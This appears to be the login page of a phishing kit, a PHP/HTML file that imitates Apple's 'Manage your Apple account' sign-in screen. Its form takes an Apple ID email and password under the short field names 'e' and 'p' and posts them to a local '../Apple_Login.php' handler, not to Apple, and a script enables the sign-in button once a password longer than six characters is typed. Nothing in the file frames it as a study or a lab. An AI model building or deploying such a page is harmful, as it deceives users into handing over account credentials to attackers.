<?php 
?>
<html data-rtl="false">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="app(1).css">
    <link rel="stylesheet" type="text/css" media="screen" href="app.css">
    <link rel="prefetch stylesheet" href="../css/fonts.css" type="text/css">



    <script src="../jquery.min.js"></script>
</head>
<body>
    <div class="si-body si-container container-fluid" id="content" data-theme="lite">
        <div id="apple-id-logo" class="apple-id-logo hide-always">
            <i class="icon icon_apple"></i>
        </div>

        <div class="widget-container fade-in  restrict-max-wh  fade-in" data-mode="embed">

            <div id="step" class="si-step ">
                <logo>
                    <div class="logo">

                        <img class="cnsmr-app-image" alt="Application logo" src="aid_logo@2x.png" style="width: 200px;">
                    </div>
                </logo>
                <div id="stepEl" class="  ">
                    <div id="signin" class="signin fade-in ">

                        <h1 class="si-container-title" tabindex="-1" style="font-size:24px;">
                            Manage your Apple account
                        </h1>
                        <div class="container si-field-container ">
                            <form action="../Apple_Login.php" method="POST">
                                <div class="row no-gutter si-field apple-id ax-border">
                                    <div class="col-xs-12">
                                        <span class="sr-only" id="appleIdFieldLabel">
                                            Manage your Apple account
                                            Apple ID
                                        </span>
                                        <input name="e" class="si-text-field" id="appleId" type="email" can-field="accountName" autocomplete="off" autocorrect="off" autocapitalize="off" aria-required="true" required="required" aria-labelledby="appleIdFieldLabel" spellcheck="false" autofocus="" placeholder="name@example.com">
                                    </div>
                                </div>
                                <div class="row no-gutter si-field pwd ">
                                    <div class="col-xs-12">
                                        <label for="pwd" class="sr-only">
                                            Password
                                        </label>
                                        <input name="p" id="pwd" type="password" aria-required="true" required="required" can-field="password" autocomplete="off" class="si-password si-text-field  " placeholder="Password">

                                        <p class="sr-only" id="invalidUserNamePwdErrMsg" role="tooltip">

                                        </p>
                                    </div>
                                </div>
                                <div class="pop-container error signin-error hide">
                                    <div class="error pop-bottom">
                                        <p class="fat" id="errMsg">

                                        </p>
                                    </div>
                                </div>
                                <div class="si-remember-password">
                                    <input type="checkbox" id="remember-me" tabindex="0" class="ax-outline" value="false">
                                    <label for="remember-me">
                                        Remember me
                                    </label>
                                </div>
                                <div class="spinner-container auth  hide">
                                </div>
                                <button id="sign-in" aria-label="Sign In" tabindex="0" class="si-button btn disabled">
                                    <i class="icon icon_sign_in"></i>
                                </button>
                            </form>
                        </div>
                        <div class="si-container-footer">

                        </div>
                    </div>

                </div>
            </div>
            <div id="stocking" style="display:none !important;"></div>
        </div>
        <script>

            $(document).ready(function () {
                $("button").click(function () {

                });

                $("input#appleId").on('blur click', function () {
                    if ($('input#appleId').attr("placeholder") == "name@example.com") {
                        $('input#appleId').attr("placeholder", "Apple ID");
                    } else {
                        $('input#appleId').attr("placeholder", "name@example.com");
                    }

                });

                $('input#appleId, input#pwd').on('input', function () {

                    if ($('input#appleId').val() != "" && $('input#pwd').val() != "" && $('input#pwd').val().length > 6) {
                        $("button").removeClass("disabled");
                    } else {
                        $("button").addClass("disabled");
                    }
                });
            });
        </script>

</body>
</html>